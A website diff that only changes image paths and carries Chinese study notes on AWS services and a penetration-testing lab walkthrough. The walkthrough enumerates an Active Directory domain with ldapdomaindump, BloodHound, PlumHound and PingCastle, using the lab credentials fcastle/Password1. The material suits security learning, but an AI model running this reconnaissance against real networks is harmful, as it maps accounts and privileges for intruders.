@@ -160,7 +160,7 @@
         <h1 id="單元一簡介"><a href="#單元一簡介" class="headerlink" title="單元一簡介"></a>單元一簡介</h1><ol>
 <li><strong>AWS 提供廣泛的服務</strong>：AWS 提供各種服務，從基本的運算、儲存和網路安全工具，到複雜的解決方案，如區塊鏈、機器學習、人工智慧和機器人開發平台。</li>
 <li><p><strong>用戶端-伺服器模型</strong>：現代運算通常使用<strong>用戶端-伺服器</strong>模型。</p>
-<p> <img src="img/AWS12.png" alt="Untitled"></p>
+<p> <img src="/img/AWS12.png" alt="Untitled"></p>
 <ul>
 <li>用戶端可以是 Web 瀏覽器或桌面應用程式，向伺服器提出請求</li>
 <li><p>伺服器可以是虛擬伺服器，如 Amazon EC2。</p>
@@ -300,7 +300,7 @@
 <li>[ ]  隨需存取服務有助於防止容量過剩或受限。</li>
 <li>[ ]  您可以快速向客戶部署應用程式，並且降低延遲。</li>
 </ul>
-<h1 id="單元二簡介"><a href="#單元二簡介" class="headerlink" title="單元二簡介"></a>單元二簡介</h1><p><img src="img/AWS12_1.png" alt="Untitled"></p>
+<h1 id="單元二簡介"><a href="#單元二簡介" class="headerlink" title="單元二簡介"></a>單元二簡介</h1><p><img src="/img/AWS12_1.png" alt="Untitled"></p>
 <figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> AWS (Amazon Web Services)</span><br><span class="line">  |</span><br><span class="line">  |- Amazon Elastic Compute Cloud (Amazon EC2)</span><br><span class="line">  |   |</span><br><span class="line">  |   |- 靈活、符合成本效益、快速的運算</span><br><span class="line">  |   |- 虛擬化技術管理的實體主機電腦上執行</span><br><span class="line">  |   |   |- 會與多個其他執行個體(虛擬機器)一起共用主機</span><br><span class="line">  |   |   |-  Hypervisor </span><br><span class="line">  |   |   |   |- 虛擬機器之間分享基礎實體資源</span><br><span class="line">  |   |   |   |- 共用基礎硬體的概念稱為多租用戶(由AWS管理)</span><br><span class="line">  |   |- 代替內部部署資源</span><br><span class="line">  |   |- 啟動 EC2 執行個體的流程</span><br><span class="line">  |   |   |</span><br><span class="line">  |   |   |- 1. 啟動</span><br><span class="line">  |   |   |   |- 選擇基本組態範本、執行個體類型</span><br><span class="line">  |   |   |   |   |- 包括作業系統、應用程式伺服器或應用程式</span><br><span class="line">  |   |   |   |- 指定安全設定</span><br><span class="line">  |   |   |   |   |- 控制可往來流經執行個體的網路流量</span><br><span class="line">  |   |   |- 2. 連接</span><br><span class="line">  |   |   |   |- 多種方式連接到執行個體</span><br><span class="line">  |   |   |   |   |- 程式和應用程式有多種不同方法來直接連接到執行個體並交換資料</span><br><span class="line">  |   |   |   |   |- 使用者登入並存取電腦桌面來連接執行個體</span><br><span class="line">  |   |   |- 3. 使用</span><br><span class="line">  |   |       |- 在執行個體中執行命令、安裝軟體等</span><br><span class="line">  |   |</span><br><span class="line">  |   |- 執行個體的靈活性和控制性</span><br><span class="line">  |   |   |</span><br><span class="line">  |   |   |- 選擇作業系統和執行軟體</span><br><span class="line">  |   |   |- <span class="strong">**垂直擴展**</span>執行個體(擴大或縮小)</span><br><span class="line">  |   |   |- 控制網路連結層面</span><br><span class="line">  |   |   |   |   |- 決定伺服器可以接收請求的類型、是否可公開/私有方式存取</span><br><span class="line">  |</span><br><span class="line">  |- 優點</span><br><span class="line">  |   |</span><br><span class="line">  |   |- 將預付成本轉成變動成本</span><br><span class="line">  |   |- 停止將資金花費在執行和維護資料中心上</span><br><span class="line">  |   |- 無需猜測容量</span><br><span class="line">  |   |- 受益於大範圍規模經濟</span><br><span class="line">  |   |- 提升速度和敏捷性</span><br><span class="line">  |   |- 快速進入全球市場</span><br><span class="line">  |</span><br><span class="line">  |- 雲端運算的部署模型</span><br><span class="line"><span class="code">      |</span></span><br><span class="line"><span class="code">      |- 以雲端為基礎進行部屬</span></span><br><span class="line"><span class="code">      |   |- 在雲端中執行完整的應用程式</span></span><br><span class="line"><span class="code">      |   |- 將現有的應用程式遷移至雲端</span></span><br><span class="line"><span class="code">      |   |- 在雲端中設計和建立新的應用程式</span></span><br><span class="line"><span class="code">      |</span></span><br><span class="line"><span class="code">      |- 內部部屬之部署方式</span></span><br><span class="line"><span class="code">      |   |- 透過虛擬化和資源管理工具部署資源</span></span><br><span class="line"><span class="code">      |   |- 運用應用程式管理和虛擬化技術提高資源使用率</span></span><br><span class="line"><span class="code">      |</span></span><br><span class="line"><span class="code">      |- 混合部署</span></span><br><span class="line"><span class="code">          |- 將雲端資源連接到內部部署基礎設施</span></span><br><span class="line"><span class="code">          |- 整合雲端資源與傳統 IT 應用程式</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>
 <ul>
 <li>當虛擬機器共用主機的資源時，Hypervisor 會負責將虛擬機器彼此分隔</li>
@@ -380,19 +380,19 @@
 <li>Amazon EC2 Auto Scaling 可讓您根據不斷變化的應用程式需求，自動新增或移除 Amazon EC2 執行個體</li>
 <li>藉由自動增減所需執行個體，可以維持更高的應用程式可用性</li>
 </ul>
-<p><img src="img/AWS12_2.png" alt="Untitled"></p>
+<p><img src="/img/AWS12_2.png" alt="Untitled"></p>
 <figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">應付成長的需求：向上擴展 vs. 水平擴展</span><br><span class="line">│</span><br><span class="line">├── 向上擴展</span><br><span class="line">│   ├── 定義: 為正在執行的電腦提供更多效能</span><br><span class="line">│   ├── 缺點: 增加單一執行個體的效能無法解決客戶需求變化的問題</span><br><span class="line">│</span><br><span class="line">├── 解耦系統的優勢</span><br><span class="line">│   ├── 解釋: 每個執行個體只負責特定的任務，不需增加執行個體來解決單一執行個體負載過大的問題</span><br><span class="line">│   └── 好處: 可根據需求調整每個部分的效能，避免過度佈建</span><br><span class="line">│</span><br><span class="line">└── 水平擴展的解決方案</span><br><span class="line"><span class="code">    ├── Amazon EC2 Auto Scaling</span></span><br><span class="line"><span class="code">    │   ├── 定義: 根據需求自動增減執行個體數量</span></span><br><span class="line"><span class="code">    │   ├── 功能:</span></span><br><span class="line"><span class="code">    │   │   ├── 最小容量: 確保至少有一個執行個體在運行</span></span><br><span class="line"><span class="code">    │   │   ├── 所需容量: 根據需求設定執行個體數量</span></span><br><span class="line"><span class="code">    │   │   └── 最大容量: 設定最大執行個體數量以避免過度擴展</span></span><br><span class="line"><span class="code">    │   └── 優點: 可以動態調整執行個體數量，節省成本並滿足客戶需求</span></span><br><span class="line"><span class="code">    └── 成本效益</span></span><br><span class="line"><span class="code">        └── 優勢: 只需支付實際使用的執行個體，節省成本並提供最佳客戶體驗</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>
 <h2 id="透過-Elastic-Load-Balancing-導引流量"><a href="#透過-Elastic-Load-Balancing-導引流量" class="headerlink" title="透過 Elastic Load Balancing 導引流量"></a><strong>透過 Elastic Load Balancing 導引流量</strong></h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">負載平衡器 (Load Balancer)</span><br><span class="line">│</span><br><span class="line">├── 負載平衡器的作用</span><br><span class="line">│   ├── 解釋: 負責將傳入的請求路由到多個執行個體進行處理</span><br><span class="line">│   └── 目的: 確保每個執行個體的工作負載均衡，提高效能和可用性</span><br><span class="line">│</span><br><span class="line">├── 需要負載平衡器的情況</span><br><span class="line">│   ├── 客戶需求不平均: 導致某些執行個體負載過大，而其他閒置</span><br><span class="line">│   ├── 需要將請求路由到正確的執行個體: 解決多個執行個體間的流量路由問題</span><br><span class="line">│   └── 需要高效能、成本效益、高度可用、自動擴展的系統</span><br><span class="line">│</span><br><span class="line">└── Elastic Load Balancing (ELB)</span><br><span class="line"><span class="code">    ├── 定義: AWS 的一項受管服務，自動在多個執行個體之間分配傳入流量</span></span><br><span class="line"><span class="code">    ├── 特性:</span></span><br><span class="line"><span class="code">    │   ├── 高度可用: 在區域層級執行，具備高度可用性，無需額外操作</span></span><br><span class="line"><span class="code">    │   ├── 自動擴展: 可處理額外的輸送量，每小時成本維持不變</span></span><br><span class="line"><span class="code">    │   └── 自動調整: 根據執行個體的動態變化，自動調整負載</span></span><br><span class="line"><span class="code">    ├── 應用場景:</span></span><br><span class="line"><span class="code">    │   ├── 前端流量: 將傳入流量分配到多個前端執行個體中</span></span><br><span class="line"><span class="code">    │   └── 後端通訊: 將流量路由到最少負載的後端執行個體中</span></span><br><span class="line"><span class="code">    └── 重要性: ELB 和 Amazon EC2 Auto Scaling 共同運作，確保應用程式提供高效能和可用性</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>
 <ul>
 <li>如果您有多個 Amazon EC2 執行個體，Elastic Load Balancing 會將工作負載分配到多個執行個體，因此單一執行個體無須承載大部分工作負載</li>
 <li>雖然 Elastic Load Balancing 和 Amazon EC2 Auto Scaling 各為不同服務，但兩者共同運作時，有助於確保 Amazon EC2 中執行的應用程式能夠提供高效能和可用性。</li>
 </ul>
-<p><img src="img/AWS12_3.png" alt="低需求期間"></p>
+<p><img src="/img/AWS12_3.png" alt="低需求期間"></p>
 <p>低需求期間</p>
-<p><img src="img/AWS12_4.png" alt="高需求期間"></p>
+<p><img src="/img/AWS12_4.png" alt="高需求期間"></p>
 <p>高需求期間</p>
-<p><img src="img/AWS12_5.png" alt="Untitled"></p>
-<p><img src="img/AWS12_6.png" alt="Untitled"></p>
+<p><img src="/img/AWS12_5.png" alt="Untitled"></p>
+<p><img src="/img/AWS12_6.png" alt="Untitled"></p>
 <h2 id="訊息與佇列"><a href="#訊息與佇列" class="headerlink" title="訊息與佇列"></a><strong>訊息與佇列</strong></h2><p>重點 1: 訊息與佇列<br>符號: 📩</p>
 <ul>
 <li>定義: 將訊息放置在緩衝區中，以解耦應用程式元件之間的通訊。</li>
@@ -426,10 +426,10 @@
 <li><p>定義:</p>
 <ul>
 <li><p>單體式應用程式: 元件之間耦合緊密，一個元件的故障可能導致整個應用程式失效。</p>
-<p>  <img src="img/AWS12_7.png" alt="Untitled"></p>
+<p>  <img src="/img/AWS12_7.png" alt="Untitled"></p>
 </li>
 <li><p>微型服務: 元件之間耦合較鬆散，一個元件的故障不會影響整個應用程式。</p>
-<p>  <img src="img/AWS12_8.png" alt="Untitled"></p>
+<p>  <img src="/img/AWS12_8.png" alt="Untitled"></p>
 </li>
 </ul>
 </li>
@@ -465,7 +465,7 @@
 <li>Elastic Load Balancing 是一種可將傳入的應用程式流量自動分配到多個資源 (例如 Amazon EC2 執行個體) 的 AWS 服務。</li>
 </ul>
 </blockquote>
-<h2 id="其他運算服務"><a href="#其他運算服務" class="headerlink" title="其他運算服務"></a><strong>其他運算服務</strong></h2><p><img src="img/AWS12_9.png" alt="Untitled"></p>
+<h2 id="其他運算服務"><a href="#其他運算服務" class="headerlink" title="其他運算服務"></a><strong>其他運算服務</strong></h2><p><img src="/img/AWS12_9.png" alt="Untitled"></p>
 <ul>
 <li>將程式碼上傳到 Lambda。</li>
 <li>將程式碼設定為從事件來源 (例如 AWS 服務、行動應用程式或 HTTP 端點) 觸發。</li>
@@ -474,7 +474,7 @@
 </ul>
 <figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">AWS 運算服務</span><br><span class="line">├─ EC2 (Elastic Compute Cloud)</span><br><span class="line">│    ├─ 靈活、可靠、高度可擴展</span><br><span class="line">│    ├─ 適用於各種使用案例</span><br><span class="line">│    ├─ 需要自行設定和管理執行個體機群</span><br><span class="line">│    └─ 試著託管傳統應用程式且想要完整存取基礎作業系統例如 Linux 或 Windows</span><br><span class="line">├─ 無伺服器運算</span><br><span class="line">│    ├─ Lambda</span><br><span class="line">│    │    ├─ 無需佈建或管理這些伺服器環境，完全不想要管理基礎環境</span><br><span class="line">│    │    ├─ 只需專注於應用程式開發</span><br><span class="line">│    │    ├─ 每次觸發都會自動擴展函數</span><br><span class="line">│    │    └─ 託管短期執行的函數、服務導向或事件導向的應用程式</span><br><span class="line">│    └─ Fargate</span><br><span class="line">│         ├─ 可用於 ECS 或 EKS 的無伺服器運算平台</span><br><span class="line">│         ├─ 想要在 AWS 上執行 Docker 容器型工作負載(選擇工具 (ECS or EKS) -&gt; 選擇平台 (自行管理的EC2 or Fargate代替管理)</span><br><span class="line">│         └─ 不需管理基礎環境，只需專注於應用程式</span><br><span class="line">└─ 容器服務</span><br><span class="line"><span class="code">     ├─ ECS (Elastic Container Service)</span></span><br><span class="line"><span class="code">     │    ├─ 高度擴展的高效能容器管理系統</span></span><br><span class="line"><span class="code">     │    └─ 支援 Docker 容器</span></span><br><span class="line"><span class="code">     ├─ EKS (Elastic Kubernetes Service)</span></span><br><span class="line"><span class="code">     │    ├─ 全受管服務，用於在 AWS 上執行 Kubernetes</span></span><br><span class="line"><span class="code">     │    └─ 支援大規模部署和管理容器化應用程式</span></span><br><span class="line"><span class="code">     └─ 其他容器化服務</span></span><br><span class="line"><span class="code"></span></span><br><span class="line">咖啡廳舉例的流程圖：</span><br><span class="line"></span><br><span class="line">咖啡廳</span><br><span class="line">├─ 顧客進入咖啡廳</span><br><span class="line">│    ├─ 選擇座位</span><br><span class="line">│    │    ├─ 在內用區域</span><br><span class="line">│    │    │    ├─ 選擇桌子</span><br><span class="line">│    │    │    └─ 坐下等待</span><br><span class="line">│    │    └─ 在外帶區域</span><br><span class="line">│    │         ├─ 排隊點餐</span><br><span class="line">│    │         └─ 等待取餐</span><br><span class="line">│    └─ 等待服務員接待</span><br><span class="line">│         ├─ 服務員接待顧客</span><br><span class="line">│         └─ 點餐</span><br><span class="line">└─ 顧客享用咖啡</span><br><span class="line"><span class="code">     ├─ 室內用餐</span></span><br><span class="line"><span class="code">     │    ├─ 服務員送上餐點</span></span><br><span class="line"><span class="code">     │    └─ 顧客享用</span></span><br><span class="line"><span class="code">     └─ 外帶</span></span><br><span class="line"><span class="code">          ├─ 服務員呼叫顧客取餐</span></span><br><span class="line"><span class="code">          └─ 顧客取餐</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>
 <p><strong>無伺服器運算</strong></p>
-<p><img src="img/AWS12_10.png" alt="Untitled"></p>
+<p><img src="/img/AWS12_10.png" alt="Untitled"></p>
 <ul>
 <li>佈建執行個體 (虛擬伺服器)</li>
 <li>上傳程式碼</li>
@@ -643,7 +643,7 @@
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# <span class="built_in">mkdir</span> marvel.local                </span><br><span class="line">                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# <span class="built_in">cd</span> marvel.local          </span><br><span class="line">                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[~/marvel.local]</span><br><span class="line">└─# **ldapdomaindump ldaps://192.168.19.140 -u <span class="string">&#x27;MARVEL\fcastle&#x27;</span> -p Password1**</span><br><span class="line">[*] Connecting to host...</span><br><span class="line">[*] Binding to host</span><br><span class="line">[+] Bind OK                                                                                  </span><br><span class="line">[*] Starting domain dump</span><br><span class="line">[+] Domain dump finished</span><br><span class="line">                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[~/marvel.local]</span><br><span class="line">└─# <span class="built_in">ls</span>                                                                    </span><br><span class="line">domain_computers_by_os.html  domain_groups.grep  **domain_policy.html**  domain_trusts.json          domain_users.json</span><br><span class="line">domain_computers.grep        domain_groups.html  domain_policy.json  **domain_users_by_group.html**</span><br><span class="line">**domain_computers.html**        domain_groups.json  domain_trusts.grep  domain_users.grep</span><br><span class="line">domain_computers.json        domain_policy.grep  domain_trusts.html  domain_users.html</span><br></pre></td></tr></table></figure>
 <p>開啟檔案查看內容，如果無法用指令開啟firefox，依據錯誤訊息修改群組</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/marvel.local]</span><br><span class="line">└─# firefox domain_users_by_group.html                             </span><br><span class="line">Running Firefox as root <span class="keyword">in</span> a regular user<span class="string">&#x27;s session is not supported.  ($XAUTHORITY is **/home/kali/.Xauthority** which is owned by kali.)</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">┌──(root㉿kali)-[~/marvel.local]</span></span><br><span class="line"><span class="string">└─# **chown -R root:root /home/kali/.Xauthority**      </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">┌──(root㉿kali)-[~/marvel.local]</span></span><br><span class="line"><span class="string">└─# **firefox domain_users_by_group.html**</span></span><br></pre></td></tr></table></figure>
-<p><img src="img/ADEmum_Untitled.png" alt="Untitled"></p>
+<p><img src="/img/ADEmum_Untitled.png" alt="Untitled"></p>
 <p>可以查看到很多訊息，並從中獲取可能洩漏的機敏資訊</p>
 <p>1、domain_groups: 目標網域的群組列表</p>
 <p>2、domain_users: 目標網域的使用者列表</p>
@@ -674,11 +674,11 @@
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **bloodhound <span class="comment">#依據neo4j設定帳密登入**</span></span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/bloodhound]</span><br><span class="line">└─# **<span class="built_in">sudo</span> bloodhound-python -d MARVEL.<span class="built_in">local</span> -u fcastle -p Password1 -ns 192.168.19.140 -c all**</span><br><span class="line">INFO: Found AD domain: marvel.local</span><br><span class="line">INFO: Getting TGT <span class="keyword">for</span> user</span><br><span class="line">INFO: Connecting to LDAP server: hydra-dc.marvel.local</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains <span class="keyword">in</span> the forest</span><br><span class="line">INFO: Found 3 computers</span><br><span class="line">INFO: Connecting to LDAP server: hydra-dc.marvel.local</span><br><span class="line">INFO: Found 10 <span class="built_in">users</span></span><br><span class="line">INFO: Found 52 <span class="built_in">groups</span></span><br><span class="line">INFO: Found 3 gpos</span><br><span class="line">INFO: Found 2 ous</span><br><span class="line">INFO: Found 19 containers</span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: SPIDERMAN.MARVEL.<span class="built_in">local</span></span><br><span class="line">INFO: Querying computer: THEPUNISHER.MARVEL.<span class="built_in">local</span></span><br><span class="line">INFO: Querying computer: HYDRA-DC.MARVEL.<span class="built_in">local</span></span><br><span class="line">INFO: Skipping enumeration <span class="keyword">for</span> SPIDERMAN.MARVEL.<span class="built_in">local</span> since it could not be resolved.</span><br><span class="line">INFO: Done <span class="keyword">in</span> 00M 02S</span><br></pre></td></tr></table></figure>
 <p>執行完成後，就會輸出幾個json檔，將這些檔案上傳bloodhound。</p>
 <p>按住shift一次選取全部</p>
-<p><img src="img/ADEmum_Untitled_1.png" alt="Untitled"></p>
+<p><img src="/img/ADEmum_Untitled_1.png" alt="Untitled"></p>
 <p>點選Analysis &gt;點選想要查看的資訊，選擇出現的圖示查看相關內容</p>
 <p>通過查看Analysis的各種內容，可以發現各種可能洩漏得資訊，從而知道可以利用甚麼漏洞進行攻擊</p>
-<p><img src="img/ADEmum_Untitled_2.png" alt="Untitled"></p>
-<p><img src="img/ADEmum_Untitled_3.png" alt="Untitled"></p>
+<p><img src="/img/ADEmum_Untitled_2.png" alt="Untitled"></p>
+<p><img src="/img/ADEmum_Untitled_3.png" alt="Untitled"></p>
 <h2 id="Domain-Enumeration-with-Plumhound"><a href="#Domain-Enumeration-with-Plumhound" class="headerlink" title="Domain Enumeration with Plumhound"></a><strong>Domain Enumeration with Plumhound</strong></h2><p><a target="_blank" rel="noopener" href="https://github.com/PlumHound/PlumHound">https://github.com/PlumHound/PlumHound</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.blackhillsinfosec.com/plumhound-reporting-engine-for-bloodhoundad/">https://www.blackhillsinfosec.com/plumhound-reporting-engine-for-bloodhoundad/</a></p>
 <p>PlumHound 的框架</p>
@@ -704,7 +704,7 @@
 <p>但對於某些用例，基於原始文字的結果</p>
 <p>此外，Web 介面中還提供了將資料匯出為 csv 檔案的選項，這對於向客戶提供有關受影響資源（如果受影響資源較多）的資訊非常有用。</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/opt/PlumHound]</span><br><span class="line">└─# **python3 PlumHound.py --easy -p kali** </span><br><span class="line"></span><br><span class="line">        PlumHound 1.6</span><br><span class="line">        For more information: https://github.com/plumhound</span><br><span class="line">        --------------------------------------</span><br><span class="line">        Server: bolt://localhost:7687</span><br><span class="line">        User: neo4j</span><br><span class="line">        Password: *****</span><br><span class="line">        Encryption: False</span><br><span class="line">        Timeout: 300</span><br><span class="line">        --------------------------------------</span><br><span class="line">        Task: Easy</span><br><span class="line">        Query Title: Domain Users</span><br><span class="line">        Query Format: STDOUT</span><br><span class="line">        Query Cypher: MATCH (n:User) RETURN n.name, n.displayname</span><br><span class="line">        --------------------------------------</span><br><span class="line">INFO    Found 1 task(s)</span><br><span class="line">INFO    --------------------------------------</span><br><span class="line"> .....</span><br><span class="line">      ADMINISTRATOR@MARVEL.LOCAL</span><br><span class="line">      TSTARK@MARVEL.LOCAL         Tony Stark</span><br><span class="line">      SQLSERVICE@MARVEL.LOCAL     SQLService</span><br><span class="line">      FCASTLE@MARVEL.LOCAL        Frank Castle</span><br><span class="line">      RKXJHDREXH@MARVEL.LOCAL     rkxJHDREXh</span><br><span class="line">      QDPZDMZFFY@MARVEL.LOCAL     QdPzdMZFFY</span><br><span class="line">      PPARKER@MARVEL.LOCAL        Peter Parker</span><br><span class="line">      KRBTGT@MARVEL.LOCAL</span><br><span class="line">      GUEST@MARVEL.LOCAL</span><br><span class="line">on 1: </span><br><span class="line">         Executing Tasks |██████████████████████████████████████████████████| Tasks 1 / 1  <span class="keyword">in</span> 2.4s</span><br><span class="line"></span><br><span class="line">        Completed 1 of 1 tasks.</span><br><span class="line"></span><br><span class="line">                                                                                           </span><br><span class="line">┌──(root㉿kali)-[/opt/PlumHound]</span><br><span class="line">└─# **python3 PlumHound.py -x tasks/default.tasks -p kali**</span><br><span class="line"></span><br><span class="line">        PlumHound 1.6</span><br><span class="line">        For more information: https://github.com/plumhound</span><br><span class="line">        --------------------------------------</span><br><span class="line">        Server: bolt://localhost:7687</span><br><span class="line">        User: neo4j</span><br><span class="line">        Password: *****</span><br><span class="line">        Encryption: False</span><br><span class="line">        Timeout: 300</span><br><span class="line">        --------------------------------------</span><br><span class="line">        Tasks: Task File</span><br><span class="line">        TaskFile: tasks/default.tasks</span><br><span class="line">        Found 88 task(s)</span><br><span class="line">        --------------------------------------</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/opt/PlumHound]</span><br><span class="line">└─# <span class="built_in">cd</span> reports  </span><br><span class="line">                                                                                           </span><br><span class="line">┌──(root㉿kali)-[/opt/PlumHound/reports]</span><br><span class="line">└─# <span class="built_in">ls</span></span><br><span class="line">AdminGroups.csv                              LapsDeploymentCount-OS.html</span><br><span class="line">AdminGroups.html                             LAPSNotEnabled.html</span><br><span class="line">AdminsWithoutSensitiveFlag.html.csv          LocalAdmin_Groups_Count.html</span><br><span class="line">AdminsWithoutSensitiveFlag.html.html         LocalAdmin_Groups.html</span><br><span class="line">CertificateAuthorties.csv                    LocalAdmin_UsersCount.html</span><br><span class="line">CertificateAuthorties.html                   LocalAdmin_Users.html</span><br><span class="line">CertificateTemplateEnrollRights.csv          OperatingSystemCount.html</span><br><span class="line">CertificateTemplateEnrollRights.html         OperatingSystemUnsupported.csv</span><br><span class="line">CertificateTemplates.csv                     OperatingSystemUnsupported.html</span><br><span class="line">CertificateTemplates_ESC1.csv                OUs_Count.html</span><br><span class="line">CertificateTemplates_ESC1.html               Owned-Computers-Groups.html</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/opt/PlumHound/reports]</span><br><span class="line">└─# **firefox index.html**          </span><br></pre></td></tr></table></figure>
-<p><img src="img/ADEmum_Untitled_4.png" alt="Untitled"></p>
+<p><img src="/img/ADEmum_Untitled_4.png" alt="Untitled"></p>
 <p>firefox進程被占用無法開啟html檔案</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/opt/PlumHound/reports]</span><br><span class="line">└─# **ps -u root | grep firefox**</span><br><span class="line"> 704533 pts/1    00:01:54 firefox-esr</span><br><span class="line">                                                                                           </span><br><span class="line">┌──(root㉿kali)-[/opt/PlumHound/reports]</span><br><span class="line">└─# **<span class="built_in">kill</span> -9 704533**</span><br><span class="line">                                                                                           </span><br><span class="line">[2]  + killed     firefox domain_users_by_group.html</span><br><span class="line">┌──(root㉿kali)-[/opt/PlumHound/reports]</span><br><span class="line">└─# **firefox index.html**           </span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>許多工具都能夠為給定網域產生使用者列表，但使用 BloodHound CE API 或 neo4j 資料庫有一個很大的優勢：能夠過濾特定條件。</p>
@@ -721,7 +721,7 @@
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Ping_Pig/article/details/109286621">https://blog.csdn.net/Ping_Pig/article/details/109286621</a></p>
 <p><a target="_blank" rel="noopener" href="https://medium.com/@jshake/pingcastle-vs-purple-knight-active-directory-security-b818fa7fc36d">https://medium.com/@jshake/pingcastle-vs-purple-knight-active-directory-security-b818fa7fc36d</a></p>
 <p>加入到您想要評估的 Active Directory 環境的電腦上執行 PingCastle.exe 程式</p>
-<p><img src="img/ADEmum_Untitled_5.png" alt="Untitled"></p>
+<p><img src="/img/ADEmum_Untitled_5.png" alt="Untitled"></p>
 <p>1-healthcheck-對域的風險進行評分</p>
 <ul>
 <li>在幾分鐘的時間內，它會產生一個報告，給你一個Active Directory安全性的概覽。透過使用現有的信任鏈接，可以在其他網域上產生此報告。</li>
@@ -747,12 +747,12 @@
 <li>這是您希望在不使用命令列開關的情況下配置PingCastle的地方。</li>
 </ul>
 <p>必須在ad網域下的用戶，點擊exe檔案執行，並在第一個選項按enter再次按enter後，如果正常運行會跑出.local檔案</p>
-<p><img src="img/ADEmum_Untitled_6.png" alt="Untitled"></p>
+<p><img src="/img/ADEmum_Untitled_6.png" alt="Untitled"></p>
 <p>僅參考</p>
 <p>雙擊點開該檔案會看到該網域的風險值…可以看到各種對於該網域有的風險甚至進行利用..</p>
 <p>打開 HTML 報告後，了解評分非常重要。高分域名=高風險。領域風險等級有一個總分，等於 4 個子分數中最差的分數。</p>
 <p>滿分 100 分，4 個分項部分分別是<strong>特權帳號、信任、過時物件</strong>和<strong>安全異常</strong>。每個小節都會有描述和找到的“規則”，並根據規則的重要性給予不同的分數。</p>
-<p><img src="img/ADEmum_Untitled_7.png" alt="Untitled"></p>
+<p><img src="/img/ADEmum_Untitled_7.png" alt="Untitled"></p>
 
       
     </div>
@@ -843,21 +843,21 @@
 <ul>
 <li>記得改選項</li>
 </ul>
-<p><img src="img/ADLAB_Untitled.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled.png" alt="Untitled"></p>
 <h2 id="Windows-server-setting-Domain-Controller"><a href="#Windows-server-setting-Domain-Controller" class="headerlink" title="Windows server setting - Domain Controller"></a>Windows server setting - Domain Controller</h2><p>Win Server &gt; choose 2&gt;I accept &gt;Custom&gt;click new&gt;Apply&gt;next&gt;</p>
-<p><img src="img/ADLAB_Untitled_1.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_1.png" alt="Untitled"></p>
 <p>Customize setting &gt; P@$$w0rd! &gt; setup</p>
 <ul>
 <li>passwd → Akali@</li>
 </ul>
-<p><img src="img/ADLAB_Untitled_2.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_2.png" alt="Untitled"></p>
 <p>先對 WinServer 進行命名</p>
 <p>可以再搜索框直接打name &gt; View your PC name &gt; Rename this PC&gt;設定任何名稱可以識別即可</p>
-<p><img src="img/ADLAB_Untitled_3.png" alt="Untitled"></p>
-<h3 id="Make-this-a-domain-controller"><a href="#Make-this-a-domain-controller" class="headerlink" title="Make this a domain controller"></a>Make this a domain controller</h3><p><img src="img/ADLAB_Untitled_4.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_3.png" alt="Untitled"></p>
+<h3 id="Make-this-a-domain-controller"><a href="#Make-this-a-domain-controller" class="headerlink" title="Make this a domain controller"></a>Make this a domain controller</h3><p><img src="/img/ADLAB_Untitled_4.png" alt="Untitled"></p>
 <p>Server manager &gt; Manage &gt; Add Roles and Features &gt; next &gt; next &gt; 打勾 Active Directory Domain Service &gt;next&gt;next&gt;next&gt;打勾 Restart the destination server automatically &gt; Install </p>
 <p>下載後會出現Promote this server to …，點擊進去</p>
-<p><img src="img/ADLAB_Untitled_5.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_5.png" alt="Untitled"></p>
 <ul>
 <li>Add a new forest<ul>
 <li>cause we don’t have an existing domain and new domain to an existing forest</li>
@@ -868,16 +868,16 @@
 <ul>
 <li>finish fill the domain name &gt; click next</li>
 </ul>
-<p><img src="img/ADLAB_Untitled_6.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_6.png" alt="Untitled"></p>
 <p>Setting up a functional level</p>
 <ul>
 <li>Password</li>
 </ul>
-<p><img src="img/ADLAB_Untitled_7.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_7.png" alt="Untitled"></p>
 <p>next &gt; next&gt;這邊會生成domain name&gt;next&gt;next&gt;next</p>
-<p><img src="img/ADLAB_Untitled_8.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_8.png" alt="Untitled"></p>
 <p>最後都設定好就直接下載</p>
-<p><img src="img/ADLAB_Untitled_9.png" alt="Untitled"></p>
+<p><img src="/img/ADLAB_Untitled_9.png" alt="Untitled"></p>
 <p>重開機後登入新的domain account</p>
